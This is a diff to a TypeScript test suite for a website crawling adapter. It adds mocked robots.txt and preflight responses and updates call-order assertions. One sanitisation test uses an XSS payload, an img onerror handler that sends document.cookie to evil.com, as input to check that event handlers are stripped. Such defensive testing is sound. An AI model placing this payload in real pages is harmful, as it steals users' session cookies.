@@ -5,6 +5,7 @@ import type { ContextSource } from "@/core/business-context/types";
 // ─── Helpers ─────────────────────────────────────────────────────────────────
 
 function makeSource(overrides: Partial<ContextSource> = {}): ContextSource {
+  const { metadata: metaOverrides, ...rest } = overrides;
   return {
     id: "src-1",
     workspaceId: "ws-1",
@@ -15,13 +16,16 @@ function makeSource(overrides: Partial<ContextSource> = {}): ContextSource {
     status: "registered",
     currentStage: null,
     terminalOutcome: null,
-    metadata: { approvedDomains: ["example.com"] },
+    metadata: { approvedDomains: ["example.com"], ...metaOverrides },
     collectedAt: new Date(),
-    ...overrides,
+    ...rest,
   };
 }
 
 function makeFetchResponse(body: unknown, status = 200): Response {
+  if (typeof body === "string") {
+    return new Response(body, { status });
+  }
   return new Response(JSON.stringify(body), {
     status,
     headers: { "Content-Type": "application/json" },
@@ -185,6 +189,12 @@ describe("WebsiteSourceAdapter", () => {
 
     it("allows URLs matching exact approved domain", async () => {
       fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse("User-agent: *\nAllow: /\n")
+      );
+      fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse(null, 200)
+      );
+      fetchSpy.mockResolvedValueOnce(
         makeFetchResponse({
           success: true,
           data: { markdown: "Content", metadata: { title: "Home" } },
@@ -205,6 +215,12 @@ describe("WebsiteSourceAdapter", () => {
     });
 
     it("allows URLs on subdomains of approved domains", async () => {
+      fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse("User-agent: *\nAllow: /\n")
+      );
+      fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse(null, 200)
+      );
       fetchSpy.mockResolvedValueOnce(
         makeFetchResponse({
           success: true,
@@ -250,6 +266,9 @@ describe("WebsiteSourceAdapter", () => {
         makeFetchResponse("User-agent: *\nDisallow: /private/\n"),
       );
       fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse(null, 200)
+      );
+      fetchSpy.mockResolvedValueOnce(
         makeFetchResponse({
           success: true,
           data: { markdown: "Content" },
@@ -266,8 +285,13 @@ describe("WebsiteSourceAdapter", () => {
         }),
       });
 
-      expect(fetchSpy).toHaveBeenCalledWith(
+      expect(fetchSpy).toHaveBeenNthCalledWith(
+        1,
         "https://example.com/robots.txt",
+      );
+      expect(fetchSpy).toHaveBeenNthCalledWith(
+        3,
+        "https://api.firecrawl.dev/v1/scrape",
         expect.anything(),
       );
     });
@@ -290,6 +314,11 @@ describe("WebsiteSourceAdapter", () => {
       if (!result.ok) {
         expect(result.error.code).toBe("ROBOTS_DISALLOWED");
       }
+      expect(fetchSpy).toHaveBeenCalledTimes(1);
+      expect(fetchSpy).toHaveBeenNthCalledWith(
+        1,
+        "https://example.com/robots.txt",
+      );
     });
   });
 
@@ -297,6 +326,12 @@ describe("WebsiteSourceAdapter", () => {
 
   describe("timeouts", () => {
     it("enforces configurable request timeout", async () => {
+      fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse("User-agent: *\nAllow: /\n")
+      );
+      fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse(null, 200)
+      );
       fetchSpy.mockRejectedValueOnce(new DOMException("Timeout", "AbortError"));
 
       const result = await adapter.collect({
@@ -316,6 +351,12 @@ describe("WebsiteSourceAdapter", () => {
 
     it("applies default timeout when none specified", async () => {
       fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse("User-agent: *\nAllow: /\n")
+      );
+      fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse(null, 200)
+      );
+      fetchSpy.mockResolvedValueOnce(
         makeFetchResponse({
           success: true,
           data: { markdown: "Fast content" },
@@ -329,7 +370,7 @@ describe("WebsiteSourceAdapter", () => {
         source: makeSource({ externalReference: "https://example.com" }),
       });
 
-      const fetchCall = fetchSpy.mock.calls[0];
+      const fetchCall = fetchSpy.mock.calls[2];
       expect(fetchCall[1].signal).toBeInstanceOf(AbortSignal);
     });
   });
@@ -338,6 +379,12 @@ describe("WebsiteSourceAdapter", () => {
 
   describe("page budget", () => {
     it("rejects crawl when page count exceeds 30 pages per site", async () => {
+      fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse("User-agent: *\nAllow: /\n")
+      );
+      fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse(null, 200)
+      );
       fetchSpy.mockResolvedValueOnce(
         makeFetchResponse({
           success: true,
@@ -368,7 +415,44 @@ describe("WebsiteSourceAdapter", () => {
     });
 
     it("tracks cumulative page count across multiple collects", async () => {
-      fetchSpy.mockResolvedValue(
+      // First collect: robots.txt + preflight + Firecrawl
+      fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse("User-agent: *\nAllow: /\n")
+      );
+      fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse(null, 200)
+      );
+      fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse({
+          success: true,
+          data: { markdown: "Content" },
+          creditsUsed: 1,
+        }),
+      );
+
+      // Second collect: robots.txt + preflight + Firecrawl
+      fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse("User-agent: *\nAllow: /\n")
+      );
+      fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse(null, 200)
+      );
+      fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse({
+          success: true,
+          data: { markdown: "Content" },
+          creditsUsed: 1,
+        }),
+      );
+
+      // Third collect: robots.txt + preflight + Firecrawl (should exceed budget)
+      fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse("User-agent: *\nAllow: /\n")
+      );
+      fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse(null, 200)
+      );
+      fetchSpy.mockResolvedValueOnce(
         makeFetchResponse({
           success: true,
           data: { markdown: "Content" },
@@ -413,6 +497,12 @@ describe("WebsiteSourceAdapter", () => {
       const largeContent = "x".repeat(5 * 1024 * 1024 + 1);
 
       fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse("User-agent: *\nAllow: /\n")
+      );
+      fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse(null, 200)
+      );
+      fetchSpy.mockResolvedValueOnce(
         makeFetchResponse({
           success: true,
           data: { markdown: largeContent },
@@ -439,6 +529,12 @@ describe("WebsiteSourceAdapter", () => {
       const content = "x".repeat(4 * 1024 * 1024);
 
       fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse("User-agent: *\nAllow: /\n")
+      );
+      fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse(null, 200)
+      );
+      fetchSpy.mockResolvedValueOnce(
         makeFetchResponse({
           success: true,
           data: { markdown: content },
@@ -463,6 +559,12 @@ describe("WebsiteSourceAdapter", () => {
 
   describe("canonical dedupe", () => {
     it("deduplicates pages with same canonical URL", async () => {
+      fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse("User-agent: *\nAllow: /\n")
+      );
+      fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse(null, 200)
+      );
       fetchSpy.mockResolvedValueOnce(
         makeFetchResponse({
           success: true,
@@ -507,6 +609,12 @@ describe("WebsiteSourceAdapter", () => {
 
   describe("content dedupe", () => {
     it("deduplicates pages with identical content", async () => {
+      fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse("User-agent: *\nAllow: /\n")
+      );
+      fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse(null, 200)
+      );
       fetchSpy.mockResolvedValueOnce(
         makeFetchResponse({
           success: true,
@@ -555,6 +663,12 @@ describe("WebsiteSourceAdapter", () => {
         '<img src=x onerror="fetch(\'http://evil.com/steal?c=\'+document.cookie)">';
 
       fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse("User-agent: *\nAllow: /\n")
+      );
+      fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse(null, 200)
+      );
+      fetchSpy.mockResolvedValueOnce(
         makeFetchResponse({
           success: true,
           data: { markdown: maliciousContent },
@@ -578,6 +692,12 @@ describe("WebsiteSourceAdapter", () => {
     });
 
     it("applies line-prefix isolation for LLM consumption", async () => {
+      fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse("User-agent: *\nAllow: /\n")
+      );
+      fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse(null, 200)
+      );
       fetchSpy.mockResolvedValueOnce(
         makeFetchResponse({
           success: true,
@@ -606,6 +726,12 @@ describe("WebsiteSourceAdapter", () => {
     });
 
     it("strips HTML event handlers from content", async () => {
+      fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse("User-agent: *\nAllow: /\n")
+      );
+      fetchSpy.mockResolvedValueOnce(
+        makeFetchResponse(null, 200)
+      );
       fetchSpy.mockResolvedValueOnce(
         makeFetchResponse({
           success: true,
